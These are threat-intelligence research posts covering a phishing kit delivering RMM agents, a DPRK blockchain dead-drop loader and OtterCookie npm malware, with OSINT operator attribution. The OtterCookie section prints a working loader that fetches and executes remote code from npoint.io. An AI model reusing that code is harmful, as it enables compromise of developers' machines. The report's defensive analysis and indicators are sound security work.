docs.title: Phishing Kit Analysis
docs.text:
Pivoting further on the threat actor domains and hosting patterns, I managed to pull down the complete source code of the phishing page deployed on the compromised website (Exhibit 8). The PHP source files (index.php, download.php, settings.php) are a purpose-built phishing kit designed to impersonate an Adobe Reader update page and deliver the SuperOps RMM agent, with real-time operator visibility into victim interactions (Exhibit 9). The page presents a convincing Adobe-branded warning — "Your Adobe Reader Version Has Expired" — and includes a countdown timer that triggers an automatic download of the payload after a configurable delay (set to 10 seconds in this deployment). There's also a manual "Download Update Now" button. The downloaded file is served as AdobeReaderDC.ClientSetup.exe — not the MSI itself — suggesting the operator wraps or renames payloads depending on the delivery method.

Exhibit 8: Adobe Phishing Page Source Code

Exhibit 9: Fake Adobe Update Site Observed in Phishing Campaign

docs.title: Telegram Operator Notifications
docs.text:
The kit is configured to send real-time notifications to the operator via a Telegram bot (Exhibit 10).

Exhibit 10: Telegram Notifications Logic

Both page visits and file downloads trigger separate Telegram alerts containing detailed victim information: IP address, geolocation (resolved via the ip-api.com service), browser type, device type, ISP, referrer URL, and timestamp. That gives the operator immediate visibility into which targets clicked the phishing link and whether they downloaded the payload.

docs.title: Log Analysis
docs.text: The visits.log and downloads.log files recovered alongside the phishing kit source code show activity going back to 13 April 2025. The logs record multiple IP addresses that interacted with the phishing page, including 191.96.207[.]10 (geolocated to Kerkrade, the Netherlands) and 102.182.190[.]199 (geolocated to Cape Town, South Africa) — both appearing frequently across the entries. The provenance of the logs themselves can't be independently verified, so I can't tell with confidence whether these IPs represent threat actor infrastructure, testing activity, victims, or third-party researchers.

docs.title: Additional Findings
docs.text:
Two more findings from the recovered files.

ConnectWise ScreenConnect distribution: the executable hosted on the phishing page at the time of collection (AdobeReaderDC.ClientSetup.exe, SHA256 47ccb2d4ebf50f962d89f7827316a10376377a86ba427279294bcec1326b0918) was actually a ConnectWise ScreenConnect installer — not the SuperOps MSI delivered to the targeted user — which confirms that the same phishing infrastructure is used to push multiple RMM tools, swapping the payload depending on the campaign phase or target.

Anti-analysis .htaccess configuration: the .htaccess file (SHA256 cf0a46f5b89ce3d7af6b7305a6d404526a4773445769ce67bcbf427aed30673d) deployed alongside the kit shows real operational awareness from the operator. It blocks all mobile devices (the payload is Windows-only), search engine crawlers (Google, Bing, Yandex, Baidu, DuckDuckGo), SEO analysis tools (Ahrefs, SEMrush, Majestic), security scanners (Nessus, Nikto, Acunetix, Qualys, Nmap, SQLmap, Nuclei, WPScan), headless browsers and automation frameworks (Puppeteer, Selenium, PhantomJS, Playwright), social media crawlers (TelegramBot, Twitter, LinkedIn, Slack, Discord), command-line tools (curl, wget, python), and empty user agents.

The interesting bit is that the .htaccess also blocks specific Google infrastructure IPs (172.253.234[.]208, 172.253.234[.]223, 172.253.192[.]126, 172.253.192[.]123, 172.253.216[.]59, 173.194.92[.]180) that match entries in the recovered downloads.log — meaning the operator actively monitors traffic to the phishing page and reactively updates the blocklist as crawlers hit it (Exhibit 11).

Exhibit 11: Content of ".htaccess" File

docs.title: Discovery of a Microsoft Teams-Themed Phishing Kit Delivering Datto RMM
docs.text:
Pivoting further on the .htaccess file (SHA256 cf0a46f5b89ce3d7af6b7305a6d404526a4773445769ce67bcbf427aed30673d), I recovered a second, distinct phishing kit from the same threat actor infrastructure (Exhibit 12). Where the first kit impersonated Adobe Reader and delivered SuperOps, this one impersonates Microsoft Teams and delivers a Datto RMM agent — confirming the operator runs multiple parallel campaigns with different social engineering themes and RMM payloads, all stitched together by the same tooling and tradecraft.

Exhibit 12: Second Phishing Kit

docs.title: Shared .htaccess Configuration as an Attribution Anchor
docs.text: The .htaccess deployed alongside the Teams-themed kit is near-identical to the one recovered from the Adobe-themed infrastructure. Both files block the same six specific Google infrastructure IPs (172.253.234[.]208, 172.253.234[.]223, 172.253.192[.]126, 172.253.192[.]123, 172.253.216[.]59, 173.194.92[.]180), the same GoogleBot IP ranges (66.249.64–79), the same mobile UAs, search engine crawlers, SEO tools (Ahrefs, SEMrush, Majestic), security scanners (Nessus, Nikto, Acunetix, Qualys, Nmap, SQLmap, Nuclei, WPScan), headless browsers (Puppeteer, Selenium, PhantomJS, Playwright), social media crawlers (Telegram, Twitter, LinkedIn, Slack, Discord), command-line tools (curl, wget, python), and empty user agents. The identical reactive Google IP blocking — targeting the same six specific addresses previously observed in the Adobe campaign's downloads.log — is a high-confidence indicator that both kits are operated by the same actor or group sharing a common anti-detection template.

docs.title: Social Engineering Flow
docs.text:
The Teams-themed kit walks the victim through a multi-stage flow designed to look like a legitimate Microsoft software update:

  1. Phishing link delivery — the victim receives a phishing link.
  2. Device filtering — index.php routes through invite.php, which performs server-side device detection via user-agent analysis. Only Windows devices are allowed through to the main lure page; everything else (iPhone, Android, iPad, Mac, BlackBerry) is redirected to Device-error.php, which displays a Microsoft-branded message stating "This application is only available on Windows devices." The kit also includes a localhost bypass (127.0.0.1 / ::1) for operator testing.
  3. Fake update page — Windows visitors hit main.php, which presents a convincing Microsoft Teams-branded page claiming "Your Microsoft Teams Client is Out of Date" with a loading spinner and an automatic redirect to the fake Microsoft Store after a 1-second delay. This page also fires visit notifications to both the Telegram bot and the operator's email on load.
  4. Fake Microsoft Store — microsoft_store.php is a polished replica of the Microsoft Store application page for Microsoft Teams. It includes a functional sidebar, search bar, Windows taskbar simulation, app screenshots, ratings (4.3 stars, 22K reviews), and a "Discover more" section featuring Zoom Workspace and Adobe Acrobat Reader DC — notably the same two application brands used across this actor's other phishing campaigns. When the victim clicks "Install" the page simulates a download progress bar (0–100%), then triggers the actual payload download and redirects to an installation guide.
  5. Installation guide — installation_guides.php provides step-by-step instructions styled with Microsoft Teams branding, walking the victim through finding and executing AgentSetup_Axon_Inc.exe from their Downloads folder, with a direct re-download link for good measure.

Exhibit 13: Additionally Discovered MS Teams Fake Website

docs.title: Payload: Datto RMM Agent
docs.text:
The payload here is a Datto RMM agent, downloaded directly from Datto's legitimate infrastructure at:

hxxps://merlot.rmm.datto[.]com/download-agent/windows/6ebac777-206c-4a91-acdd-909a1828bbb2

Saved to disk as AgentSetup_Axon_Inc.exe. The Axon_Inc string in the filename and the UUID in the download URL correspond to a specific Datto RMM tenant account, following the same pattern as the SuperOps campaign — the actor registers (or compromises) an account on a legitimate RMM platform and generates an agent installer tied to their tenant. Datto RMM (formerly Autotask Endpoint Management / CentraStage), like SuperOps, gives the operator full remote access — shell, file transfer, arbitrary command execution, endpoint monitoring — through legitimately signed binaries.

docs.title: Dual Notification Channels: Telegram and Email
docs.text:
Unlike the Adobe-themed kit, which relied solely on Telegram, this one runs a dual-channel operator notification system:

  • Telegram notifications (track_verification.php) go to a different bot and chat ID than the Adobe campaign.
  • Email notifications (send.php) are handled via PHPMailer with the operator's email address configured in ChangeMe.ini.

Operator email: Kharpercimra@protonmail[.]com

Both channels capture the same victim telemetry on every page visit, download attempt, and verification event: IP address, geolocation, ISP, browser, OS, and timestamp. Activity is also logged locally to ./Guard/Audio/live.txt (Exhibit 14).

Exhibit 14: Content of "./Guard/Audio/live.txt" File

docs.title: Operator OPSEC Failures Revealing Kit Lineage
docs.text:
A few copy-paste artefacts in the kit's source code reveal the operator adapted this Microsoft Teams-themed kit from an earlier Zoom-themed variant:

  • In send.php, the download notification email header reads "NEW ZOOM DOWNLOAD ATTEMPT" despite all other references in the file using "Teams" branding (Exhibit 15).
  • The email notification sender name is hardcoded as "Zoom Monitoring".
  • In microsoft_store.php, the JavaScript comment alongside the Datto RMM download URL reads // Example Zoom download URL.

Exhibit 15: Content of "send.php" File

These artefacts indicate the operator maintains a modular phishing kit framework that's re-skinned across multiple application brands — Adobe Reader, Zoom, and Microsoft Teams — while reusing the same backend notification infrastructure, anti-detection logic, and delivery mechanics. I'd expect more variants themed around other commonly targeted applications to exist within the same campaign infrastructure.

docs.title: Telegram Bot OSINT and Operator Attribution
docs.text:
The Telegram bot configured in the Teams-themed kit was queryable via Telegram's public Bot API. The getMe method returned the bot's identity (Exhibit 16):

Field Value Bot ID 7669484417 Bot Display Name Evilman_logs Receiver bot (Vip Hacker) Bot Username @bolexsss_bot

The display name explicitly references "Evilman_logs" and "Vip Hacker", confirming the malicious purpose of the bot and suggesting the operator may be using a commercially available or shared cybercriminal toolset for credential logging.

Exhibit 16: getMe Telegram Response

docs.title: Telegram getUpdates Analysis
docs.text:
Querying getUpdates returned recent messages sent to the bot. The most recent message, dated 16 March 2026 at 14:35 UTC, was a photo sent by a Telegram user with the following details (Exhibit 17):

Field Value User ID 5090243433 Display Name N00B Cyb0T Username @am******* Language Code English Telegram Premium Yes

The timestamp confirms the bot was actively in use as recently as one day prior to collection, indicating the associated phishing infrastructure is still operationally active. Note that the user ID observed in the getUpdates response (5090243433) differs from the chat_id configured in the kit's tele_settings.php (6573403598). The kit is configured to deliver victim notifications to a separate account or group chat (6573403598), while @am******* is a distinct individual who has interacted directly with the bot.

Exhibit 17: getUpdates Telegram Response

docs.title: BreachForums Activity
docs.text:
I went looking for the Telegram username @am******* elsewhere. The same handle is active on BreachForums (breachforums[.]st), a prominent English-language cybercriminal forum. The account am******* shows up in multiple threads, including a reply on 26 March 2025 to a thread distributing a 19,300-entry Algerian credential combolist, and — on the same date — a detailed review thread evaluating multiple carded credit card shops.

The review thread, titled "CC Stores review (DONT BUY ALL SCAM AND TRASH)", gives a first-person account of the author's experience purchasing stolen credit cards from six different underground shops (including briansclub, Gonzo, RealValid, and Fernandogoods), with detailed notes on card validity rates, pricing, refund policies, and operational frustrations. The post demonstrates an active and experienced involvement in credit card fraud.

The interesting bit is the conclusion: the author states that purchasing cards from CC shops is unsustainable, and that it would be preferable to invest in "sms/email/smtp sender and host and all these spamming tools and run my own spamming."

That's a direct, dated statement of intent to pivot from carding to phishing infrastructure operations — and that's precisely the activity I have been documenting throughout this analysis: PHP-based phishing kits with PHPMailer integration, Telegram-based victim notification systems, and multi-brand social engineering lures delivering RMM agents.

docs.title: Attribution Assessment
docs.text:
I assess with high confidence that the Telegram account @am******* ("N00B Cyb0T"), the BreachForums account am*******, and the operator behind at least the Microsoft Teams-themed phishing kit are the same individual, or are closely affiliated. The reasoning:

  1. Identical username across both platforms.
  2. The BreachForums account's stated intent to transition from carding to phishing/spamming infrastructure aligns directly with the observed phishing kit operations.
  3. The Telegram account's direct interaction with @bolexsss_bot — the same bot configured in the kit's tele_settings.php to receive victim notifications.
  4. Timing: the BreachForums activity (March 2025) precedes the observed phishing infrastructure deployment (kit activity from April 2025 onwards).
  5. The English language setting on the Telegram account matching the English-language BreachForums posts.

docs.title: Phishing Kit Development on the Altenen Forum (September 2022)
docs.text:
Digging further turned up corroborating activity that significantly strengthens the assessment. On the Altenen Forum, a long-standing cybercriminal marketplace, a post dated 29 September 2022 authored by user aman********** advertises a Netflix credential phishing kit ("scampage"). The post explicitly lists the Telegram contact @am******* with the display name N00B Cyb0T as the point of contact for the kit — directly linking the aman********** and @am******* identities through self-declaration within the post itself. The post also references a public GitHub repository at github.com/AmanGcS***/Netflixphishingpage, where the "Aman" prefix and "741" suffix match the naming pattern observed across all associated accounts.

The advertised Netflix phishing kit shares direct architectural parallels with the Teams-themed and Adobe-themed kits recovered during this analysis. The Altenen post describes:

  • Dual-channel exfiltration via Telegram API and email.
  • Victim IP geolocation collection — country, city, region, ISP, timezone, user agent.
  • Configurable operator settings via an editable PHP file (email.php for email and Telegram bot token / chat ID — directly analogous to the tele_settings.php and ChangeMe.ini files in the recovered Teams kit).
  • Antibot protections (described in the post as "strong antibots never got redpage" — consistent with the .htaccess-based crawler blocking observed in the current campaign).
  • A multi-stage social engineering flow walking victims through sequential pages before payload delivery.

The consistency of this technical architecture across the 2022 Netflix kit and the 2025–2026 Adobe / Teams / RMM-delivery kits strongly suggests a single developer maintaining and evolving a phishing kit framework over multiple years, progressively adapting the same core infrastructure from consumer credential phishing to corporate-targeting RMM agent delivery.

docs.title: Cross-Platform Account Linkage
docs.text:
OSINT collection on both username variants (aman********** and am*******) surfaces a coherent set of accounts that pre-date the cybercriminal activity.

Both usernames have HackerOne accounts — aman********** created on 21 December 2018 and am******* on 18 August 2024. Both HackerOne accounts are bound to a single verified real-world identity, which I've kept private here. The email aman**********@gmail.com links to a Freelancer profile registered in September 2017 with country code DZ (Algeria). A Chess.com account under am******* also lists country code DZ. A secondary email aman**********@outlook.fr is tied to a Pinterest account under the same username.

The earliest accounts (Freelancer 2017, HackerOne 2018) are on legitimate platforms — freelance work and vulnerability disclosure — suggesting the individual initially explored legitimate technical career paths before transitioning to cybercriminal activity. The first observed malicious activity, the Netflix phishing kit posted on the Altenen Forum, dates to September 2022.

Exhibit 18: am** Profile on Altenen Forum

docs.title: Summary
docs.text:
While tracking DPRK-nexus weaponised package activity, I pivoted from a Socket Threat Research report published on 31 May 2026 describing a UNC5342 (Famous Chollima) JavaScript loader appended to the development branch of a legitimate Packagist-listed PHP package.1 Using the loader's distinctive in-file obfuscation stub as a VirusTotal Intelligence content selector, I identified a further sample sharing the same builder, injected into the codebase of an AI SaaS platform for padel in Spain.

The loader is nearly identical across the observed samples: a JavaScript stage appended to an otherwise-legitimate file behind a large whitespace gap, executing within the Node.js runtime and resolving its second-stage payload from cryptocurrency blockchain infrastructure (TRON, Aptos, and BNB Smart Chain RPC services) used as a dead-drop resolver rather than a conventional command-and-control domain. Only a per-build campaign marker and the host file vary between samples (the obfuscation framework, decoder seed, and resolver design are constant).

It is highly likely that the affected application is a legitimately-built commercial product compromised through injection rather than an actor-authored artefact, and as a realistic possibility that the compromised codebase is itself being repurposed as Contagious Interview lure material for subsequent developer victims. Family attribution to the UNC5342 cluster is assessed with high confidence on the basis of a shared loader builder and delivery tradecraft consistent with Socket's reporting.

docs.title: Background
docs.text:
UNC5342 is a DPRK-nexus threat cluster that has targeted software developers since at least 2023 through fraudulent technical-interview and recruitment schemes, an activity set widely tracked as Contagious Interview. The cluster is reported under several overlapping vendor designations (including Famous Chollima, DeceptiveDevelopment, and Void Dokkaebi), and its operations are characterised by the distribution of malware through trojanised packages across multiple open-source ecosystems (npm, PyPI, Go, crates.io, and, more recently, Packagist), GitHub repositories, and coding-task assignments presented as part of a hiring process. Targeting has historically concentrated on developers in the cryptocurrency, blockchain, and financial-technology sectors, with the operational objective of harvesting developer secrets, source-control credentials, cloud and CI/CD tokens, and cryptocurrency wallet material from compromised workstations.

On 31 May 2026, Socket Threat Research published an analysis of a UNC5342 loader injected into the development branch dev-drewroberts/feature/test-case of the legitimate Packagist-listed PHP package roberts/leads.1 Socket assessed the activity as a likely repository or branch compromise, a poisoned-branch workflow consistent with a Contagious Interview lure, rather than a package authored as malicious from the outset; the package's stable release line did not exhibit the indicators. The malicious code was appended to the tailwind.js configuration file behind a large whitespace gap and, once deobfuscated, behaved as a JavaScript loader that resolved its payload from blockchain infrastructure (TRON and Aptos transaction data as payload pointers, BNB Smart Chain RPC transaction input as encrypted payload material), decrypted it with hardcoded XOR keys, executed it via eval(), and spawned a hidden detached node -e second stage. Public reporting attributes the downstream payloads of this loader to the InvisibleFerret and BeaverTail families.23

This note documents a pivot from that report. The in-file artefacts Socket described, principally the loader's obfuscation framework and decoder seed, provided durable, content-searchable selectors that proved to be shared across multiple samples and host files, enabling the identification of further victims beyond the originally reported PHP package.

docs.title: Pivot Methodology
docs.text:
The pivot proceeded from content, not infrastructure. Socket's report did not publish a conventional command-and-control domain to track. The loader resolves its payload from blockchain RPC services rather than a fixed host, so the durable selectors were the loader's own in-file artefacts. Critically, Socket itself published these artefacts: its "Suggested local check" section provided a grep command intended for analysts to scan their own developer machines, listing the loader's distinctive strings, and its "Deobfuscation Findings" and "Indicators of Compromise" sections documented the same values.1 Among the strings Socket published were the obfuscated decoder variable _$_1e42, the decoder seed rmcej%otb%, and the campaign marker global['!'] (observed as 9-0264-2, expanding to A9-0264-2).

The initial selector for finding additional samples was the decoder stub variable _$_1e42, an unusual token unlikely to collide with legitimate code:

content:"_$_1e42"
Figure 1: Discovered Sample on VirusTotal (SHA256: 05b051301006b6fbea788bde4014494ef979e06ff8e5d95c9f719258751ba6f4)

This returned files beyond Socket's original roberts/leads sample. Examination confirmed the hits shared the full obfuscation construction, not merely the variable name: the same decoder function fed the seed rmcej%otb% with the multiplier 2857687, and the same global[_$_1e42[0]]=require reconstruction. The seed string was used as a corroborating second selector, being even less prone to coincidental collision:

content:"rmcej%otb%"
Figure 2: Content of the Discovered Sample

The observed sample contained an injection into an application source file of the affected application; despite arriving in a different host-file type like in the Socket research, it carried an identical decoder stub. The differences were limited to the campaign marker (9-0264-2 in Socket's case, 9-33 here) and the host file into which the loader was appended. The decoder framework, the rmcej%otb% seed, the multiplier, and the blockchain-resolver design were the same.

docs.title: Naming and Prior Reporting
docs.text: The loader analysed here has been documented publicly under several names, reflecting different vendors and different scopes of the same activity. Google's Mandiant and Threat Intelligence Group, relayed by the Canadian Centre for Cyber Security, track the blockchain dead-drop technique as EtherHiding and the specific multi-stage downloader as jadesnow.42 OpenSourceMalware track the obfuscator and an associated mass GitHub-injection campaign as PolinRider, documenting the identical decoder signature (rmcej%otb%, multiplier 2857687, variable _$_1e42) and the same blockchain wallets and XOR keys recovered in this analysis.3 Ransom-ISAC and Crystal Intelligence describe the same chain as Cross-Chain TxDataHiding.5 Public reporting attributes the downstream payload to the InvisibleFerret and BeaverTail families.23

docs.title: Obfuscation Structure
docs.text:
The loader analysis showed that the appended stub was built from four nested decoding layers, each feeding the next:

  1. A first decoder, assigned to the variable _$_1e42, performs a seeded Fisher-Yates-style shuffle of the seed string rmcej%otb% with the multiplier 2857687, followed by a character-substitution pass. It yields a small string table; the loader immediately uses it to reconstruct global['r'] = require, masking the require reference from naive static scanners.
  2. A second decoder, sfL, of the same shuffle design but different constants, expands two large encoded blobs: the first into a third decoder, and the second into the loader body.
  3. The third decoder is a dictionary or word-substitution decompressor that expands the loader body into readable JavaScript bearing a single remaining string table, _$_ccfc.
  4. A final decoder resolves _$_ccfc into the operational strings, the API paths, method names, cryptocurrency addresses, and XOR keys, on which the loader depends.

The salient point for hunting is that the campaign marker (global['!'], here 9-33) is the only element that meaningfully rotates between builds, alongside the host file. The decoder construction, the seed rmcej%otb%, and the multiplier are invariant across all examined samples, and are therefore the reliable family selectors. This is corroborated by OpenSourceMalware, who independently documented the same four-layer structure and the same ('rmcej%otb%', 2857687) / _$_1e42 signature across their campaign dataset.3

Figure 3: Fully deobfuscated `_$_ccfc` string table (indices 0–57) recovered statically from the 9-33 sample, showing the TRON wallets, Aptos accounts, BSC RPC hosts, and XOR keys in clear.

docs.title: Payload Resolution: a Blockchain Dead-drop
docs.text:
Once decoded, the loader is an asynchronous function with no hardcoded command-and-control domain. Instead it resolves its payload through public cryptocurrency blockchain infrastructure used as a dead-drop, a design that places the controlling pointer and the payload body on immutable, high-availability public ledgers that are impractical to take down and that blend with legitimate blockchain traffic.

The resolution proceeds in two stages, each independently parameterised with its own wallet, account, and decryption key:

  • The loader first queries the TRON network via api.trongrid.io, retrieving the most recent outbound transaction for a hardcoded wallet and extracting a pointer from its raw_data field (hex-decoded, reversed, and reassembled). Should this fail, it falls back to the Aptos network via fullnode.mainnet.aptoslabs.com, reading the pointer from a hardcoded account's latest transaction payload.
  • Using that pointer, the loader issues a JSON-RPC eth_getTransactionByHash request to BNB Smart Chain (bsc-dataseed.binance.org, falling back to bsc-rpc.publicnode.com) and reads the transaction's input field as the encrypted payload body. The body is then XOR-decrypted with a hardcoded repeating key.
Figure 4: Deobfuscated, Annotated Loader Body Showing the Blockchain Dead-drop Resolution and Two-stage Execution

docs.title: Execution: Two Stages and a Hidden Child Process
docs.text:
The loader runs two payloads in sequence, each resolved through the mechanism above with a distinct wallet and key:

  • The first payload is executed in-process via eval().
  • The second is executed by spawning a detached child process: node -e <payload>, with detached: true, stdio: 'ignore', and windowsHide: true, so the second stage runs as an independent, windowless background process that survives the parent and produces no visible console. The campaign marker is propagated into the child through global['_V'], so the second stage inherits the build tag. An eval() of the same payload is retained as a fallback should the spawn fail.

A thirty-second self-throttle (global['_p_t'], compared against Date.getTime()) prevents the loader re-running on rapid re-require, reducing duplicate execution and associated noise.

The second-stage payloads themselves were not recovered. They do not reside in the file; they are retrieved at runtime from the blockchain, the payload pointer from a TRON transaction (Aptos as fallback) and the encrypted payload body from the referenced BNB Smart Chain transaction. Recovery therefore requires an on-chain retrieval of the relevant transactions followed by XOR decryption with the recovered keys, and is recorded as an outstanding task.

Figure 5: Thirty-second Self-Throttle and Other Stages

docs.title: Relationship to the Socket-reported Sample
docs.text: Deobfuscation of the 9-33 sample resolved the operational string table to indicators that are identical to those Socket published for the roberts/leads case: the same two TRON wallets, the same two Aptos accounts, the same two XOR keys, and the same RPC hosts.1 The samples are therefore assessed with high confidence to originate from the same builder and to share the same staging infrastructure, not merely the same technique. They are not byte-identical: the campaign marker differs (9-33 against 9-0264-2), the host file differs (the application route module AccountDataRoutes.js against tailwind.js), and the per-build encoded inner strings differ.

docs.title: The Affected Application
docs.text:
The host of the 9-33 sample appears to be a real commercial product: a multi-tenant SaaS platform for padel and tennis club management, built for the Spanish market by a third-party software vendor and marketed as an AI-assisted assistant for clubs. It's worth noting that the identifying details are masked throughout.

The platform looks like a substantial build, not a thin shell: a Node.js, Express, and MySQL backend that integrates with established court-management platforms (Playtomic, Syltek, Taykus) as a complementary automation layer, with booking automation, Stripe subscription billing, WhatsApp Business messaging, MQTT venue and lighting control, and an energy-management integration. It is publicly documented as an associate member of an international padel industry body since February 2025, with a public website and social-media presence.

docs.title: Injection Footprint and Deployment Path
docs.text:
Across the entire codebase, the loader was present in exactly one file: AccountDataRoutes.js, the Express route module handling account and Stripe billing data. Every other component, the services, controllers, middleware, scheduled jobs, utilities, the application entry point app.js, and the dependency manifests, was clean. The malicious JavaScript was appended after the file's legitimate module.exports = router; behind a large whitespace gap, the same parasitic-append pattern Socket documented for the tailwind.js case. The route is mounted in app.js, so the loader executes whenever the application loads that module.

Figure 6: A Typical DPRK Whitespace Gap Followed by the Appended Loader

docs.title: UNC5342 Refines OtterCookie Delivery Chain with JsonSilo Infrastructure
UNC5342 Refines OtterCookie Delivery Chain with JsonSilo Infrastructure
docs.text: While continuing to track DPRK-linked weaponised npm packages, I observed UNC5342 refining its delivery chain — pivoting away from Vercel infrastructure and adopting jsonsilo[.]com and npoint[.]io as payload staging points for the OtterCookie malware family.

docs.title: Background
docs.text:
UNC5342 (also tracked as Contagious Interview, DeceptiveDevelopment, Famous Chollima, and Void Dokkaebi) is a DPRK-nexus threat cluster that has persistently targeted software developers since at least 2023 through fake technical interview schemes.1 The cluster distributes malware via trojanised npm packages, GitHub repositories, and coding challenge assignments, focusing on developers in cryptocurrency, DeFi, and financial technology sectors.

OtterCookie is a JavaScript-based infostealer and lightweight RAT attributed to UNC5342, first observed in real-world attacks in September 2024.2 Unlike its companion implant BeaverTail — which functions as a downloader — OtterCookie is explicitly designed for deep credential theft and interactive remote access, targeting developer-specific secrets including .env files, private keys, clipboard contents, and cryptocurrency wallet data. The malware operates as a multi-module framework, spawning independent Node.js processes for each major capability.

JsonSilo and npoint.io are legitimate JSON storage hosting services designed to allow developers to quickly host and access JSON data via API without server setup. By November 2025, NVISO researchers publicly documented UNC5342 abusing these platforms — alongside JSON Keeper — to stage obfuscated payloads, blending malicious traffic with legitimate developer API calls.3 The research here predates that public reporting by approximately six weeks, representing an early sighting of this infrastructure shift.

docs.title: Summary
docs.text:
This research analyses UNC5342's shift to jsonsilo[.]com and npoint[.]io for distributing OtterCookie via weaponised npm packages. The delivery chain pivots from the Vercel-based gating mechanism documented in December 2025 to JSON storage services as a new staging layer. The report provides technical insights into the malware's staging mechanism, obfuscation approach, and exfiltration capabilities for network defenders and incident responders.

Key highlights:

  • UNC5342 pivoted from Vercel infrastructure to jsonsilo[.]com and npoint[.]io for payload hosting and distribution
  • The malicious npm package express-lists-routes disguises OtterCookie as a legitimate Express.js utility
  • OtterCookie creates a persistent access pipeline by systematically harvesting developer secrets — .env files, cryptocurrency private keys, and clipboard data

docs.title: Constant Infrastructure Change
docs.text:
In January 2026, I identified UNC5342 adopting jsonsilo[.]com and npoint[.]io as primary distribution points for malicious payloads. Both are legitimate developer-oriented JSON hosting services — the kind that generate zero suspicion in a developer's network traffic. This shift follows my December 2025 research into the cluster's use of Vercel infrastructure to gate and serve the OtterCandy malware family.

By rotating away from Vercel and onto JSON storage services, UNC5342 demonstrates a persistent commitment to exploiting developer-trusted platforms while evading ongoing infrastructure tracking. NVISO later confirmed this tactic more broadly, noting that UNC5342 operators were using JSON Keeper, JSONsilo, and npoint.io interchangeably across different campaign waves.3

The identified npm package — express-lists-routes — is the latest example of UNC5342's sustained reliance on weaponised npm packages as an initial access mechanism. By embedding malware in a package that appears to provide routine Express.js route listing functionality, the threat actor ensures automatic code execution at install time while blending into a legitimate supply chain.

Exhibit 1: Weaponised NPM Package (Source: npmjs.com) Exhibit 2: Base64-encoded JsonSilo.com Dropper C2 Exhibit 3: Decoded Base64 JsonSilo.com Dropper C2 (hxxps://api.jsonsilo[.]com/public/a8505bba-c743-4794-867a-a0bf41940c78) Exhibit 4: JsonSilo.com Second Stage OtterCookie Payload

Additional weaponised packages and their corresponding C2 endpoints identified during this investigation:

Package C2 Endpoint hxxps://www.npmjs[.]com/package/chai-as-executed hxxps://api.npoint[.]io/979f369bee438a98751e hxxps://www.npmjs[.]com/package/chai-as-enhanced hxxps://api.jsonsilo[.]com/public/cc268b04-1284-45d9-9bdc-952c4f8cf983

The chai-as-executed package is particularly notable. The malicious logic encodes the C2 URL as a Base64 string stored inside a fake environment variable, then decodes and fetches it at runtime using axios:

const process = {
  env: {
    DEV_API_KEY: "aHR0cHM6Ly9hcGkubnBvaW50LmlvLzk3OWYzNjliZWU0MzhhOTg3NTFl",
    DEV_SECRET_KEY: "eC1zZWNyZXQta2V5",
    DEV_SECRET_VALUE: "Xw==",
  }
};

(async function getCallers(..._args) {
  const src = atob(process.env.DEV_API_KEY);
  const k = atob(process.env.DEV_SECRET_KEY);
  const v = atob(process.env.DEV_SECRET_VALUE);

  let retrycnt = 5;
  while (retrycnt > 0) {
    try {
      const s = (await axios.get(src, { headers: { [k]: v } })).data.cookie;
      const handler = new Function.constructor("require", s);
      handler(require);
      break;
    } catch (error) { retrycnt--; }
  }
})();

Decoding DEV_API_KEY yields hxxps://api.npoint[.]io/979f369bee438a98751e — the npoint.io C2 endpoint. The custom header (x-secret-key: _) echoes the same authentication gating pattern observed in the December 2025 campaign, here applied to the npoint.io resolver rather than Vercel.

docs.title: Technical Analysis of the Staging Mechanism
docs.text:
The malicious payload uses a multi-layered obfuscation strategy designed to hinder static analysis and evade automated detection. The outer layer uses a heavily modified JavaScript obfuscator employing control flow flattening, string array rotation, and anti-tampering regex checks.

OtterCookie is explicitly architected as a multi-module framework — each major capability runs as an independent detached Node.js process, managed through lock files and PID tracking. The main entry point spawns three separate malicious components, each with its own lock file and role.

Exhibit 5: Lock Components with their Own Lock Files Exhibit 6: OtterCookie Components

Upon successful execution, the outer wrapper decrypts and executes three distinct payloads stored as large string variables — identified during analysis as v38, v39, and v40 — containing the core logic for credential theft, file exfiltration, and remote access respectively. These strings are written to lock files in the temporary directory to manage execution flow and prevent conflicting instances.

docs.title: Stealthy Exfiltration of Developer Secrets
docs.text:
OtterCookie's primary capability is systematic discovery and exfiltration of sensitive developer data — credentials, configuration secrets, source code, and private keys. This is consistent with the broader UNC5342 toolset, including BeaverTail, InvisibleFerret, and OtterCandy, which form a coordinated attack pipeline designed to compromise developers at scale through social engineering and systematically exfiltrate high-value assets.2

The malware defines large sets of sensitive keywords applied to full file paths to identify files likely to contain credentials, cryptographic material, wallets, tokens, or proprietary data. Aggressive exclusion of system directories, dependency folders, and media files demonstrates clear intent to optimise for high-value theft rather than indiscriminate collection.

Exhibit 7: File Patterns OtterCookie Recon Logic

OtterCookie performs deep recursive traversal of user-accessible directories, prioritising locations commonly used by developers — Desktop, Documents, Downloads, and project folders. On Windows systems, it expands its scope to all available drives.

Exhibit 8: Locations Prioritisation OtterCookie Logic

Each discovered file is evaluated for readability, size threshold, and sensitivity criteria before exfiltration — minimising failed uploads and avoiding large files that could draw attention.

Exhibit 9: MAX_FILE_SIZE_BYTES OtterCookie Criteria Logic

Qualifying files are exfiltrated using authenticated HTTP uploads. Requests include host identifiers and the original file path, allowing the attacker to reconstruct directory context server-side.

Exhibit 10: OtterCookie Exfiltration Logic to hxxp://144.172.116[.]80:8086/upload

Separate network channels handle different functions: port 8085 for structured file uploads via /api/upload-file, and port 8087 as the primary C2 endpoint for telemetry, WebSocket command execution, and clipboard data exfiltration.

Exhibit 11: Ports in Use for Different Functions

Beyond opportunistic scanning, OtterCookie implements explicit targeted searches for .env files — which frequently contain API keys, database credentials, and cloud secrets — using platform-native tooling across entire systems.

Exhibit 12: .env OtterCookie Recon Logic

Beyond disk-resident files, the malware continuously harvests transient secrets through clipboard monitoring — capturing credentials, tokens, and wallet addresses that may never be written to disk.

Exhibit 13: OtterCookie Clipboard Monitoring Logic

Clipboard access uses platform-specific mechanisms including PowerShell on Windows, ensuring reliable access across development environments.

Exhibit 14: getClipboardContent Function for Clipboard Access

All exfiltrated data — whether file-based or clipboard-derived — is transmitted to attacker-controlled endpoints, with host identification tightly coupled to stolen content.

Exhibit 15: OtterCookie C2 Capabilities Exhibit 16: OtterCookie C2 Server

docs.title: Lightweight RAT Capabilities
docs.text:
Beyond data theft, OtterCookie provides interactive remote control — effectively functioning as a lightweight RAT. The malware establishes a persistent WebSocket connection to the C2 server, enabling operators to execute arbitrary shell commands and browse directories using native filesystem APIs to preserve Unicode correctness.

Exhibit 17: WebSocket Connection Capability Exhibit 18: Arbitrary Shell Commands Capability

docs.title: UNC5342 NPM Malware Uses Custom Headers to Gate Malicious Payload
